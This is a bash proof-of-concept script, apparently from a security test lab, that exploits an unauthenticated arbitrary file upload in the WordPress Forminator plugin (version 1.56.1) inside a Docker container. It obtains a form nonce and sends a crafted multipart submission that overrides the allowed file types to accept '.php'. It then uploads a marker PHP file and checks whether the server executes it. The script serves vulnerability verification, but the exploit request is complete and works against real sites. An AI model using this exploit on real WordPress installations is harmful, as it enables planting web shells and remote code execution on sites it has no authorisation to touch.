#!/usr/bin/env bash
set -euo pipefail
# shellcheck source=tests/common.sh
source "$(dirname -- "$0")/common.sh"

assert_forminator_version 1.56.1
MARKER="RS_AFU_DOCKER_$(date +%s)_$$"
TMP=$(mktemp -d "${TMPDIR:-/tmp}/forminator-afu.XXXXXX")
FORM_ID=''
PAGE_ID=''
UPLOADED=''

cleanup() {
  if [[ -n "$UPLOADED" && "$UPLOADED" == /var/www/html/wp-content/uploads/forminator/* ]]; then
    dc exec -T wordpress rm -f -- "$UPLOADED" >/dev/null 2>&1 || true
  fi
  cleanup_posts "$FORM_ID $PAGE_ID"
  rm -rf -- "$TMP"
}
trap cleanup EXIT

printf '[afu] setup marker=%s\n' "$MARKER"
SETUP=$(dc exec -T -u www-data -e LAB_MARKER="$MARKER" wordpress \
  wp --path=/var/www/html eval-file /opt/forminator-lab/afu.php)
FORM_ID=$(printf '%s' "$SETUP" | json_value form_id)
PAGE_ID=$(printf '%s' "$SETUP" | json_value page_id)

NONCE=$(curl -fsS -X POST "$BASE_URL/wp-admin/admin-ajax.php" \
  --data "action=forminator_get_nonce&form_id=$FORM_ID" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["data"])')

printf '<?php echo "RS_AFU_EXEC:%s"; ?>' "$MARKER" > "$TMP/$MARKER.php"
RESPONSE=$(curl -sS -X POST "$BASE_URL/wp-admin/admin-ajax.php" \
  -F 'action=forminator_submit_form_custom-forms' \
  -F "form_id=$FORM_ID" \
  -F "forminator_nonce=$NONCE" \
  -F 'select-1[return]=true' \
  -F 'select-1[name]=upload-1' \
  -F 'select-1[field_type]=upload' \
  -F 'select-1[key]=0' \
  -F 'select-1[field_array][element_id]=upload-1' \
  -F 'select-1[field_array][type]=upload' \
  -F 'select-1[field_array][custom-files]=true' \
  -F 'select-1[field_array][file-type]=single' \
  -F 'select-1[field_array][upload-method]=ajax' \
  -F 'select-1[field_array][additional-type]=ph(p)|text/x-php' \
  -F 'select-1[field_array][filetypes][]=jpg' \
  -F "upload-1=@$TMP/$MARKER.php;type=text/x-php")

UPLOADED=$(dc exec -T wordpress find /var/www/html/wp-content/uploads/forminator \
  -type f -name "*-$MARKER.php" -print -quit 2>/dev/null | tr -d '\r')
[[ -n "$UPLOADED" ]] || {
  printf '[afu] FAIL: marker file absent; response=%s\n' "${RESPONSE:0:240}" >&2
  exit 1
}
dc exec -T wordpress grep -Fq "RS_AFU_EXEC:$MARKER" "$UPLOADED"

REL=${UPLOADED#/var/www/html/}
BODY=$(curl -fsS "$BASE_URL/$REL")
if [[ "$BODY" == *"RS_AFU_EXEC:$MARKER"* && "$BODY" != *'<?php'* ]]; then
  EXECUTION='executed (uploads PHP execution enabled)'
else
  EXECUTION='not executed (Forminator .htaccess control active)'
fi

printf 'RS_OK %s — unauthenticated arbitrary PHP file write proven; %s\n' "$MARKER" "$EXECUTION"
